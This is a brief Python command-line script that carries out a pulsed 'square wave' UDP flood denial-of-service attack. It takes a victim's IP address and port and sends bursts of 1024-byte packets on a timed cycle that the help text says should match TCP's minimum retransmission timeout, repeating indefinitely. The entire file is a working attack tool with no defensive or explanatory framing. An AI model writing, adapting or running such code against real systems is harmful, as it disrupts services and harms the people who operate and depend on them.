import socket
import math
import time
import argparse

def attack(address, port, period, duration): 

    while True:
        sendtraffic(address, port, duration)
        time.sleep(period/1000)

def sendtraffic(address, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytearray(1024)
    starttime = get_curr_millis()

    while get_curr_millis() < starttime + duration:
       sock.sendto(payload, (address, port))

def get_curr_millis():
    return math.floor(time.time() * 1000) # time() returns near-microsecond accuracy on Linux

def main():
    parser = argparse.ArgumentParser(description='Run a square wave DoS attack')

    parser.add_argument('ip',
        metavar='ip',
        type=str,
        help='IP of the victim')

    parser.add_argument('port',
        metavar='port',
        type=int,
        help='Port of the victim')

    parser.add_argument('period',
        metavar='period',
        type=int,
        help='The period between square wave pulses in milliseconds (opimally should be minRTO)')

    parser.add_argument('duration',
        metavar='duration',
        type=int,
        help='The duration of the square wave pulse in milliseconds ')

    args = parser.parse_args()
    address = args.ip
    port = args.port
    period = args.period
    duration = args.duration

    attack(address, port, period, duration)

if __name__ == "__main__":
    main()
